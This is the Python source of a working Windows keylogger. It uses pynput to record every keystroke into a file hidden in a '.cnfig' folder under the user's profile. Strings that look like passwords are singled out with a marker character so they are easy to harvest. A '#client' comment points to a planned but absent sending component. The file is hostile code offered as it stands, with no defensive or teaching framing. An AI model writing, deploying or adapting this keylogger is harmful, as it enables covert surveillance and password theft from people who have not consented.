import threading 
from functools import partial
from pynput import keyboard
import os
import re

stop_event = threading.Event()
filename = os.getlogin() + ".txt"
dirname = ".cnfig"
word = ""
stop_event = threading.Event()

def setupFiles(path):
    new_dir = os.path.join(path, dirname)
    
    if not os.path.exists(new_dir):
        os.makedirs(new_dir, exist_ok=True)
        print(f'Dir made: {new_dir}')
    
    file_dir = os.path.join(new_dir, filename)
    files = [f for f in os.listdir(new_dir)]
    
    if len(files) == 0:
        with open(file_dir, 'a') as file:
            pass
    
    return file_dir

def checkfile():
    try: 
        path = os.path.join("C:\\Users", os.getlogin())
        if os.path.exists(path):
            return setupFiles(path)
        else:
            raise Exception("Path does not exist")
    except Exception as e:
        return e

def check_pass(password) -> bool:
    pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
    match = re.match(pattern, password)
    return bool(match)

def keyPressedF(key, file_path):
    global word
    
    with open(file_path, 'a') as log_file:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char

            elif key == keyboard.Key.space:  # Space key
                log_file.write(word + " " + "\n")  # Add the current word to the buffer
                word = ""  # Reset the word

            elif key == keyboard.Key.enter:  # Enter key
                if check_pass(word):
                    word = "\u00BF" + word  # Mark password-like words
                log_file.write(word + "\n")
                word = ""  # Reset the word

            elif key == keyboard.Key.backspace:  # Backspace key
                word = word[:-1]  # Remove the last character from the current word

            elif key == keyboard.Key.delete:  # Delete key
                log_file.write("[DELETE]\n")

            elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
                log_file.write(f"[{key.name.upper()}]\n")  # Log the special key press

            elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
                log_file.write(f"[{key.name.upper()}]\n")

            else:
                log_file.write(f"[{key}]\n")  # Log any unhandled special key presses
        except Exception as e:
            print("Error:", e)

def keyboard_logger_pathed_without_timer(path):
    print(f"Keylogger running with PID: {os.getpid()}")
    keyPressed_with_path = partial(keyPressedF, file_path=path)

    listener = keyboard.Listener(on_press=keyPressed_with_path)
    listener.start()

    try:
        while True:  # Infinite loop to keep the thread running
            threading.Event().wait(0.1)
    except KeyboardInterrupt:
        listener.stop()

def run():
    store_file = checkfile()
    if isinstance(store_file, Exception):
        return

    #client

    t1 = threading.Thread(target=keyboard_logger_pathed_without_timer, name='logger', args=(store_file,))
    t1.daemon = True  # Allows the program to exit if the main thread exits
    t1.start()

    # Keep the main thread alive indefinitely
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("Program terminated.")

if __name__ == "__main__":
    run()
